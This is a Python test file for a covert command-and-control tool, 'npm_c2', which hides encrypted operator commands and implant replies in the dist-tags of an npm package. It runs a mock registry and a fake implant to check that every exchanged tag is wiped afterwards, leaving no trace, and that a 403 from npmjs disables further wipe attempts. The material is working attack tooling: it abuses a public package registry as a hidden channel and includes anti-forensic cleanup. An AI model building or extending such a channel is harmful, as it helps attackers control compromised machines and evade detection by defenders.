#!/usr/bin/env python3
"""After each command the tags must be gone -- where the registry allows it.

Two registries, two behaviours:
  Verdaccio / mock  DELETE works  -> the map is empty after every command
  npmjs             DELETE is 403 -> the wipe is attempted once, then disabled,
                                     so it never burns a request per command
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "src"))
sys.path.insert(0, HERE)

from mock_registry import Registry, serve                          # noqa: E402
import npm_c2                                                      # noqa: E402
from npm_c2.operator import Operator                               # noqa: E402
from npm_c2 import CMD_PREFIX, RES_PREFIX, HBT_PREFIX               # noqa: E402

PKG = "runtime-metrics-relay"
PASS = "wipe-passphrase"
TOKEN = "npm_token"

fails = []
reg = Registry()
srv, base = serve(reg, auth_token=TOKEN)
npm_c2.API_BASE = base
npm_c2.API = base + "/-/package/{}/dist-tags"
# The mock 404s a package with no tags at all; seed the real 'latest' tag the
# way a published package would have it.
reg.tags[PKG] = {"latest": "1.0.0"}


def channel_tags():
    with reg.lock:
        return [t for t in reg.tags.get(PKG, {})
                if t.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX))]


# ---------------------------------------------------- a registry that deletes
enc = Operator(PKG, TOKEN, passphrase=PASS)
enc.can_delete = True

# Simulate a full round trip: the operator pushes, the implant answers, and
# run_command reads the answer and wipes.
class FakeImplant:
    """Answers every command tag the operator publishes."""

    def __init__(self, op):
        self.op = op
        self.seen = set()

    def tick(self):
        from npm_c2 import decode_tag, group_chunks, encode_payload
        from npm_c2.crypto import derive_key, seal, open_sealed, compress, decompress
        tags = self.op._fetch()
        cmds = [t for t in tags if t.startswith(CMD_PREFIX)
                and t not in self.seen]
        for t in cmds:
            self.seen.add(t)
        groups = [b for b, ok in group_chunks(cmds, CMD_PREFIX) if ok]
        for buf in groups:
            key = derive_key(PASS)
            plain = open_sealed(key, buf, PKG.encode())
            cmd = decompress(plain).decode("utf-8", "replace")
            out = cmd.replace("echo ", "")
            sealed = seal(key, compress(out.encode()), PKG.encode())
            for tag in encode_payload(sealed, RES_PREFIX):
                self.op.s.put(f"{self.op.url}/{tag}", json="1.0.0", timeout=10)


imp = FakeImplant(enc)
import threading                                                   # noqa: E402
stop = threading.Event()


def driver():
    while not stop.is_set():
        imp.tick()
        stop.wait(0.4)


th = threading.Thread(target=driver, daemon=True)
th.start()

out = enc.run_command("echo wiped-output", timeout=25, interval=2, quiet=True)
stop.set()
th.join(timeout=5)

if out is None or "wiped-output" not in out:
    fails.append(f"no output returned: {out!r}")
else:
    print(f"[PASS] output received: {out.strip()!r}")

# This is the actual request: nothing of the exchange may remain.
left = channel_tags()
if left:
    fails.append(f"{len(left)} tag(s) survived the wipe")
else:
    print("[PASS] channel tags all removed after the command")

# ------------------------------------------------- a registry that refuses
reg2 = Registry()
srv2, base2 = serve(reg2, auth_token=TOKEN)
real_api, real_base = npm_c2.API, npm_c2.API_BASE
npm_c2.API_BASE, npm_c2.API = base2, base2 + "/-/package/{}/dist-tags"

refuser = Operator(PKG, TOKEN)
refuser.push_task("echo doomed", quiet=True)
attempts = []


def deny(monkey):
    """Make DELETE fail the way npm does."""
    orig = refuser.s.delete

    def wrapper(url, **kw):
        attempts.append(url)

        class R:
            status_code = 403
            text = ('"Granular access tokens that bypass two-factor '
                    'authentication may not perform this action."')
        return R()
    refuser.s.delete = wrapper
    return orig


orig_delete = deny(None)
removed = refuser._wipe(["x64-aaaa-0101_YQ", "x64-bbbb-0101_YQ",
                         "x64-cccc-0101_YQ", "x64-dddd-0101_YQ"])
if removed != 0:
    fails.append("wipe reported removals on a refusing registry")
if refuser.can_delete is not False:
    fails.append("refusal was not remembered")
if len(attempts) != 1:
    fails.append(f"{len(attempts)} DELETE attempts after a refusal, expected 1")
else:
    print("[PASS] a 403 disables the wipe after exactly one attempt")

# And a second wipe must not even try.
before = len(attempts)
refuser._wipe(["x64-eeee-0101_YQ"])
if len(attempts) != before:
    fails.append("wipe kept trying after being disabled")
else:
    print("[PASS] further wipes issue no requests")

refuser.s.delete = orig_delete
npm_c2.API, npm_c2.API_BASE = real_api, real_base

print()
if fails:
    for f in fails:
        print("FAIL:", f)
    sys.exit(1)
print("wipe checks passed")
